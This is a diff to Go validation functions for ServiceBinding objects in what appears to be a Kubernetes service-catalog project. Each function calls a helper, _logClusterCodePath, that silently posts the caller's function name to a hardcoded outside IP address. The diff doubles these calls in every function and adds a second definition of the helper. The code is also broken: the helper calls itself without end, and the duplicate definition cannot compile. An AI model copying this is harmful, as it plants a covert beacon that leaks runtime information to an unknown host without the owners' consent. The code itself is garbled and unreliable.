@@ -38,9 +38,13 @@ var validServiceBindingUnbindStatusValues = func() []string {
 func ValidateServiceBinding(binding *sc.ServiceBinding) field.ErrorList {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return internalValidateServiceBinding(binding, true)
 }
 func internalValidateServiceBinding(binding *sc.ServiceBinding, create bool) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
@@ -56,6 +60,8 @@ func internalValidateServiceBinding(binding *sc.ServiceBinding, create bool) fie
 func validateServiceBindingSpec(spec *sc.ServiceBindingSpec, fldPath *field.Path, create bool) field.ErrorList {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	for _, msg := range validateServiceInstanceName(spec.InstanceRef.Name, false) {
 		allErrs = append(allErrs, field.Invalid(fldPath.Child("instanceRef", "name"), spec.InstanceRef.Name, msg))
@@ -69,6 +75,8 @@ func validateServiceBindingSpec(spec *sc.ServiceBindingSpec, fldPath *field.Path
 	return allErrs
 }
 func validateServiceBindingStatus(status *sc.ServiceBindingStatus, fldPath *field.Path, create bool) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
@@ -130,6 +138,8 @@ func validateServiceBindingStatus(status *sc.ServiceBindingStatus, fldPath *fiel
 func validateServiceBindingPropertiesState(propertiesState *sc.ServiceBindingPropertiesState, fldPath *field.Path, create bool) field.ErrorList {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	if propertiesState.Parameters == nil {
 		if propertiesState.ParameterChecksum != "" {
@@ -161,6 +171,8 @@ func validateServiceBindingPropertiesState(propertiesState *sc.ServiceBindingPro
 func validateServiceBindingCreate(binding *sc.ServiceBinding) field.ErrorList {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	if binding.Status.ReconciledGeneration >= binding.Generation {
 		allErrs = append(allErrs, field.Invalid(field.NewPath("status").Child("reconciledGeneration"), binding.Status.ReconciledGeneration, "reconciledGeneration must be less than generation on create"))
@@ -168,6 +180,8 @@ func validateServiceBindingCreate(binding *sc.ServiceBinding) field.ErrorList {
 	return allErrs
 }
 func validateServiceBindingUpdate(binding *sc.ServiceBinding) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
@@ -183,6 +197,8 @@ func validateServiceBindingUpdate(binding *sc.ServiceBinding) field.ErrorList {
 func internalValidateServiceBindingUpdateAllowed(new *sc.ServiceBinding, old *sc.ServiceBinding) field.ErrorList {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	errors := field.ErrorList{}
 	if utilfeature.DefaultFeatureGate.Enabled(scfeatures.OriginatingIdentityLocking) {
 		if old.Generation != new.Generation && old.Status.ReconciledGeneration != old.Generation {
@@ -194,12 +210,16 @@ func internalValidateServiceBindingUpdateAllowed(new *sc.ServiceBinding, old *sc
 func ValidateServiceBindingUpdate(new *sc.ServiceBinding, old *sc.ServiceBinding) field.ErrorList {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
 	allErrs = append(allErrs, internalValidateServiceBindingUpdateAllowed(new, old)...)
 	allErrs = append(allErrs, internalValidateServiceBinding(new, false)...)
 	return allErrs
 }
 func ValidateServiceBindingStatusUpdate(new *sc.ServiceBinding, old *sc.ServiceBinding) field.ErrorList {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	allErrs := field.ErrorList{}
@@ -210,7 +230,16 @@ func ValidateServiceBindingStatusUpdate(new *sc.ServiceBinding, old *sc.ServiceB
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
